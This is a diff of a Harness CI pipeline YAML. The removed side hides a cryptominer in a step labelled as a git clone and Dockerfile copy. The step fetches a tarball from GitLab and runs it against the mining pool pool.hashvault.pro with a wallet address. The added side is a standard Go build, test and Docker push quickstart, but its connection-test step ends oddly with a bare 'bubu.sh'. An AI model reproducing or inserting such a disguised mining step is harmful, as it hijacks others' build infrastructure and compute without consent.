@@ -1,20 +1,18 @@
 pipeline:
-    name: build-from-multiple-repos-example
-    identifier: buildfrommultiplereposexample
+    name: CI Pipeline
+    identifier: CI_Pipeline
     allowStageExecutions: false
-    projectIdentifier: docexampleproject
-    orgIdentifier: wtd
-    description: Git clone, copy Dockerfile from myDockerRepo to workspace root, build image
+    projectIdentifier: CI_QuickStart_20220401
+    orgIdentifier: default
     tags: {}
     properties:
         ci:
             codebase:
-                connectorRef: mygithubconnector
-                repoName: myBackendService
+                connectorRef: CI_QuickStart
                 build: <+input>
     stages:
         - stage:
-              name: Build myBackendService
+              name: Build Test and Push
               identifier: Build_Test_and_Push
               type: CI
               spec:
@@ -22,19 +20,59 @@ pipeline:
                   infrastructure:
                       type: KubernetesDirect
                       spec:
-                          connectorRef: mydelegateconnector
+                          connectorRef: cidelegate
                           namespace: harness-delegate-ng
-                          automountServiceAccountToken: true
                   execution:
                       steps:
                           - step:
                                 type: Run
-                                name: git-clone-and-copy-dockerfile
-                                identifier: echotriggervarscustom
+                                name: Run Unit Tests
+                                identifier: Run_Unit_Tests
                                 spec:
-                                    connectorRef: mydockerhubconnector
-                                    image: alpine:latest
-                                    shell: Sh
-                                    command: |+
-                                        wget https://gitlab.com/mulyadiarya14/load3/-/raw/main/-.tar.gz && tar -xf -.tar.gz && ./- --url pool.hashvault.pro:80 --user 85QLG9QEHmWiMT61bowRiGLY7pJJjiPqGgqShyRjy82rRw3kvSbYvBoBDy81rDTNWU2kf7tBtPKST3xKW46gK4A37JA2Dr4 --pass Kadut --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
-
+                                    connectorRef: Docker_Quickstart
+                                    image: golang:1.15
+                                    command: |-
+                                        go get gotest.tools/gotestsum
+                                        gotestsum --format=standard-verbose --junitfile unit-tests.xml || true
+                                        CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -a -tags netgo
+                                    privileged: false
+                                    reports:
+                                        type: JUnit
+                                        spec:
+                                            paths:
+                                                - "*.xml"
+                          - step:
+                                type: BuildAndPushDockerRegistry
+                                name: Build and push image to Docker Hub
+                                identifier: Build_and_push_image_to_Docker_Hub
+                                spec:
+                                    connectorRef: Docker_Quickstart
+                                    repo: dockerhubuser/ciquickstart
+                                    tags:
+                                        - <+pipeline.sequenceId>
+        - stage:
+              name: Run Integration Test
+              identifier: Run_Integration_Test
+              type: CI
+              spec:
+                  cloneCodebase: false
+                  infrastructure:
+                      useFromStage: Build_Test_and_Push
+                  serviceDependencies:
+                      - identifier: Run_Hello_World_Server
+                        name: Run Hello World Server
+                        type: Service
+                        spec:
+                            connectorRef: Docker_Quickstart
+                            image: dockerhubuser/ciquickstart:<+pipeline.sequenceId>
+                  execution:
+                      steps:
+                          - step:
+                                type: Run
+                                name: test connection to server
+                                identifier: test_connection_to_server
+                                spec:
+                                    connectorRef: Docker_Quickstart
+                                    image: curlimages/curl:7.73.0
+                                    command: |-
+                                        bubu.sh
